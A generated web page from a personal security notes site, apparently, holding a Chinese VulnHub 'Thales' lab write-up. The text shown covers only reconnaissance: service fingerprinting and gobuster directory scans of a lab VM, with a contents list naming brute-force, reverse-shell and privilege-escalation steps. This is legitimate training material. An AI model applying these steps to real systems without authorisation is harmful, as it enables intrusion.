@@ -1,0 +1,1589 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、侦测#Thales#古希腊哲学家泰勒斯，古希腊七贤之一，自然哲学之父，认为世界的本源是水，其名字寓意着追究自然和追求真理的精神。
+1.2 端口#22端口，服务类型ssh，版本为OpenSSH 7.6p1 Ubuntu 4ubuntu0.5，其中第一个是ssh服务软件的版本号，第二个包版本号推测，操作系统很有可能是Ubuntu18.04 LTS ssh主机密钥有：
+2048 RSA 256 ECDSA 256 ED25519 8080端口，服务类型http，版本为Apache Tomcat 9.0.52 图标属于Apache Tomcat，页面标题属于Apache Tomcat/9.0.52
+设备类型为general purpose|router，这里是通用设备和路由器二选一，这是因为许多路由器底层是裁剪的Linux内核，所以由于目标是Ubuntu服务器，它的网络行为和某些高性能路由器接近，同时由于这是虚拟机，虚拟化层的网络处理也会干扰指纹识别。
+OS CPE为cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+HOP为1，往返时延0.64ms
+结果画像
+维度 数据 结论 操作系统 Ubuntu18.04(Linux 4.15) 偏旧的linux发行版，可能有内核漏洞 远程管理 OpenSSH 7.6p1 开放了SSH，如果能拿到用户名，可以尝试暴力破解或密钥登录 业务应用 Apache Tomecat 9.0.52 发布于2021年的java web服务器，可能有CVE 设备类型 General Purpose 是服务器，而非打印机或摄像头 地理位置 1Hop/0.64ms 在旁边(同一个局域网或本地虚拟机) 1.3 HTTP#sudo gobuster dir -u http://192.168.203.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt得到/docs /examples /shell /manager
+sudo gobuster dir -u http://192.168.203.137:8080 -w /usr/share/wordlists/dirb/common.txt得到/favicon.ico /host-manager /shell
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="Thales">
+  <meta property="og:description" content="一、侦测#Thales#古希腊哲学家泰勒斯，古希腊七贤之一，自然哲学之父，认为世界的本源是水，其名字寓意着追究自然和追求真理的精神。
+1.2 端口#22端口，服务类型ssh，版本为OpenSSH 7.6p1 Ubuntu 4ubuntu0.5，其中第一个是ssh服务软件的版本号，第二个包版本号推测，操作系统很有可能是Ubuntu18.04 LTS ssh主机密钥有：
+2048 RSA 256 ECDSA 256 ED25519 8080端口，服务类型http，版本为Apache Tomcat 9.0.52 图标属于Apache Tomcat，页面标题属于Apache Tomcat/9.0.52
+设备类型为general purpose|router，这里是通用设备和路由器二选一，这是因为许多路由器底层是裁剪的Linux内核，所以由于目标是Ubuntu服务器，它的网络行为和某些高性能路由器接近，同时由于这是虚拟机，虚拟化层的网络处理也会干扰指纹识别。
+OS CPE为cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+HOP为1，往返时延0.64ms
+结果画像
+维度 数据 结论 操作系统 Ubuntu18.04(Linux 4.15) 偏旧的linux发行版，可能有内核漏洞 远程管理 OpenSSH 7.6p1 开放了SSH，如果能拿到用户名，可以尝试暴力破解或密钥登录 业务应用 Apache Tomecat 9.0.52 发布于2021年的java web服务器，可能有CVE 设备类型 General Purpose 是服务器，而非打印机或摄像头 地理位置 1Hop/0.64ms 在旁边(同一个局域网或本地虚拟机) 1.3 HTTP#sudo gobuster dir -u http://192.168.203.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt得到/docs /examples /shell /manager
+sudo gobuster dir -u http://192.168.203.137:8080 -w /usr/share/wordlists/dirb/common.txt得到/favicon.ico /host-manager /shell">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-04-07T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-15T14:20:47+08:00">
+
+
+  <meta itemprop="name" content="Thales">
+  <meta itemprop="description" content="一、侦测#Thales#古希腊哲学家泰勒斯，古希腊七贤之一，自然哲学之父，认为世界的本源是水，其名字寓意着追究自然和追求真理的精神。
+1.2 端口#22端口，服务类型ssh，版本为OpenSSH 7.6p1 Ubuntu 4ubuntu0.5，其中第一个是ssh服务软件的版本号，第二个包版本号推测，操作系统很有可能是Ubuntu18.04 LTS ssh主机密钥有：
+2048 RSA 256 ECDSA 256 ED25519 8080端口，服务类型http，版本为Apache Tomcat 9.0.52 图标属于Apache Tomcat，页面标题属于Apache Tomcat/9.0.52
+设备类型为general purpose|router，这里是通用设备和路由器二选一，这是因为许多路由器底层是裁剪的Linux内核，所以由于目标是Ubuntu服务器，它的网络行为和某些高性能路由器接近，同时由于这是虚拟机，虚拟化层的网络处理也会干扰指纹识别。
+OS CPE为cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+HOP为1，往返时延0.64ms
+结果画像
+维度 数据 结论 操作系统 Ubuntu18.04(Linux 4.15) 偏旧的linux发行版，可能有内核漏洞 远程管理 OpenSSH 7.6p1 开放了SSH，如果能拿到用户名，可以尝试暴力破解或密钥登录 业务应用 Apache Tomecat 9.0.52 发布于2021年的java web服务器，可能有CVE 设备类型 General Purpose 是服务器，而非打印机或摄像头 地理位置 1Hop/0.64ms 在旁边(同一个局域网或本地虚拟机) 1.3 HTTP#sudo gobuster dir -u http://192.168.203.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt得到/docs /examples /shell /manager
+sudo gobuster dir -u http://192.168.203.137:8080 -w /usr/share/wordlists/dirb/common.txt得到/favicon.ico /host-manager /shell">
+  <meta itemprop="datePublished" content="2026-04-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-05-15T14:20:47+08:00">
+  <meta itemprop="wordCount" content="204">
+  <meta itemprop="keywords" content="反弹shell">
+
+<title>Thales | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.ce1cb8e9fc0f60d89da645feead4b442cb232a5e2a7bd21720645a307d240b35.js" integrity="sha256-zhy46fwPYNidpkX&#43;6tS0QssjKl4qe9IXIGRaMH0kCzU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8d58ff5c5e366ab14339daed9d222b7f" class="toggle" checked />
+    <label for="section-8d58ff5c5e366ab14339daed9d222b7f" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad627e53d6d1828a1435a85961eea27f" class="toggle"  />
+    <label for="section-ad627e53d6d1828a1435a85961eea27f" class="flex">
+      <a role="button" class="">
+        xnwlaqbc靶机记录</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/" class="">
+      xnwlaqbc靶机部署与攻击</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/" class="">
+      DDos攻击测试日志</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-20b418ba6aa317c76a5b35dea36ccbca" class="toggle"  />
+    <label for="section-20b418ba6aa317c76a5b35dea36ccbca" class="flex">
+      <a href="/docs/cybersecurity/DVWA/" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/" class="">
+      dvwa初始化修复</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Authorisation-Bypass/" class="">
+      Authorisation Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSRF/" class="">
+      CSRF</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Open-HTTP-Redirect/" class="">
+      Open HTTP Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/API/" class="">
+      api</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSP-Bypass/" class="">
+      CSP Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Cyptography/" class="">
+      Cryptography</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Command-Injection/" class="">
+      Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/File-Inclusion/" class="">
+      File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/SQL-Injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/" class="">
+      kali_linux基操</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4ae5ffa90962cdf2660fe74526a01436" class="toggle"  />
+    <label for="section-4ae5ffa90962cdf2660fe74526a01436" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e003e03c1feb2b65c7b35f539ae39c73" class="toggle" checked />
+    <label for="section-e003e03c1feb2b65c7b35f539ae39c73" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="toggle"  />
+    <label for="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/" class="">
+      doubletrouble: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/" class="">
+      Vulnhub Ica 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad44293ee93b1d26cf7c58190e7d4815" class="toggle" checked />
+    <label for="section-ad44293ee93b1d26cf7c58190e7d4815" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/" class="">
+      Corrosion: 2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/" class="active">
+      Thales</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fb378fb748ece0ae1fdeedef24da3db6" class="toggle"  />
+    <label for="section-fb378fb748ece0ae1fdeedef24da3db6" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="toggle"  />
+    <label for="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-7a6315a3240f7682f305097cdf53ea82" class="toggle"  />
+    <label for="section-7a6315a3240f7682f305097cdf53ea82" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f08add9f101710f9ba3d484a35d5581b" class="toggle"  />
+    <label for="section-f08add9f101710f9ba3d484a35d5581b" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1fdf586d1ea5885edf0672ce206f530c" class="toggle"  />
+    <label for="section-1fdf586d1ea5885edf0672ce206f530c" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-94ed7c835fd2d66c69e86ff967d092f9" class="toggle"  />
+    <label for="section-94ed7c835fd2d66c69e86ff967d092f9" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/" class="">
+      加密流量基础</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="toggle"  />
+    <label for="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="flex">
+      <a role="button" class="">
+        工作</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/" class="">
+      AI安全思考</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c262361fe9aa48cd5d939ca8724680d" class="toggle"  />
+    <label for="section-2c262361fe9aa48cd5d939ca8724680d" class="flex">
+      <a role="button" class="">
+        leetcode</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c1a97b113c65b26353860b399a4f8855" class="toggle"  />
+    <label for="section-c1a97b113c65b26353860b399a4f8855" class="flex">
+      <a role="button" class="">
+        哈希</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/" class="">
+      1.两数之和</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/vigil/" class="">
+      vigil</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/" class="">
+      实习简历</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8ebb29a2ddfb039e11169448c9cf3620" class="toggle"  />
+    <label for="section-8ebb29a2ddfb039e11169448c9cf3620" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/" class="">
+      linux clash部署</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/" class="">
+      pyenv管理python版本</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega_mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win&#43;r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win&#43;r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/" class="">
+      windows终端/git 走代理</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali_linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d096fa83268a84183f67ef634318f12c" class="toggle"  />
+    <label for="section-d096fa83268a84183f67ef634318f12c" class="flex">
+      <a href="/docs/AI/" class="">
+        AI</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/claude-code-cli/" class="">
+      claude code cli</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/" class="">
+      主流AI定价</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-854542c26bded6389f67b522f4182c5e" class="toggle"  />
+    <label for="section-854542c26bded6389f67b522f4182c5e" class="flex">
+      <a role="button" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E7%BD%91%E5%AE%89/" class="">
+      网安</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B9%B3%E5%8F%B0/" class="">
+      平台</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Thales</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一侦测">一、侦测</a>
+      <ul>
+        <li><a href="#thales">Thales</a></li>
+        <li><a href="#12-端口">1.2 端口</a></li>
+        <li><a href="#13-http">1.3 HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#二攻击">二、攻击</a>
+      <ul>
+        <li><a href="#21-爆破">2.1 爆破</a>
+          <ul>
+            <li><a href="#211-hydra">2.1.1 Hydra</a></li>
+            <li><a href="#212-msf">2.1.2 msf</a></li>
+          </ul>
+        </li>
+        <li><a href="#22-反弹shell">2.2 反弹shell</a></li>
+        <li><a href="#23-shell中获取信息难">2.3 shell中获取信息（难）</a></li>
+        <li><a href="#24-ssh私钥密码破解">2.4 ssh私钥密码破解</a></li>
+        <li><a href="#25-backupsh文件利用难">2.5 backup.sh文件利用（难）</a></li>
+      </ul>
+    </li>
+    <li><a href="#三总结">三、总结</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一侦测">一、侦测<a class="anchor" href="#%e4%b8%80%e4%be%a6%e6%b5%8b">#</a></h1>
+<h2 id="thales">Thales<a class="anchor" href="#thales">#</a></h2>
+<p>古希腊哲学家泰勒斯，古希腊七贤之一，自然哲学之父，认为世界的本源是水，其名字寓意着追究自然和追求真理的精神。</p>
+<h2 id="12-端口">1.2 端口<a class="anchor" href="#12-%e7%ab%af%e5%8f%a3">#</a></h2>
+<p><code>22</code>端口，服务类型<code>ssh</code>，版本为<code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.5</code>，其中第一个是ssh服务软件的版本号，第二个包版本号推测，操作系统很有可能是<code>Ubuntu18.04 LTS</code>
+ssh主机密钥有：</p>
+<ul>
+<li>2048 RSA</li>
+<li>256 ECDSA</li>
+<li>256 ED25519</li>
+</ul>
+<p><code>8080</code>端口，服务类型<code>http</code>，版本为<code>Apache Tomcat 9.0.52</code>
+图标属于<code>Apache Tomcat</code>，页面标题属于<code>Apache Tomcat/9.0.52</code></p>
+<p>设备类型为<code>general purpose|router</code>，这里是通用设备和路由器二选一，这是因为许多路由器底层是裁剪的Linux内核，所以由于目标是Ubuntu服务器，它的网络行为和某些高性能路由器接近，同时由于这是虚拟机，虚拟化层的网络处理也会干扰指纹识别。</p>
